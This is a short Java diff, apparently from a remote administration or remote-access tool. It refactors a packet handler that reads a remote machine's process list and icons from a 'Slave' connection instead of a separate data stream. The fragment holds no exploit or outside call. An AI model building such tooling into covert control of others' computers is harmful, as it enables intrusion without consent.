@@ -13,11 +13,11 @@ import java.io.DataInputStream;
 public class PacketProcessData extends AbstractIncomingPacket {
 
 	@Override
-	public void read(Slave slave, DataInputStream dis) throws Exception {
+	public void read(Slave slave) throws Exception {
 		try {
 			PanelProcesses frame = (PanelProcesses) slave.getPanel(PanelProcesses.class);
 
-			int count = dis.readByte();
+			int count = slave.readByte();
 
 			String[] data = new String[count];
 
@@ -27,9 +27,9 @@ public class PacketProcessData extends AbstractIncomingPacket {
 			
 			BufferedImage icon = null;
 			
-			if (dis.readBoolean()) {
-				byte[] bIcon = new byte[dis.readInt()];
-				dis.readFully(bIcon);
+			if (slave.readBoolean()) {
+				byte[] bIcon = new byte[slave.readInt()];
+                slave.readFully(bIcon);
 				icon = ImageIO.read(new ByteArrayInputStream(bIcon));
 			}
 			
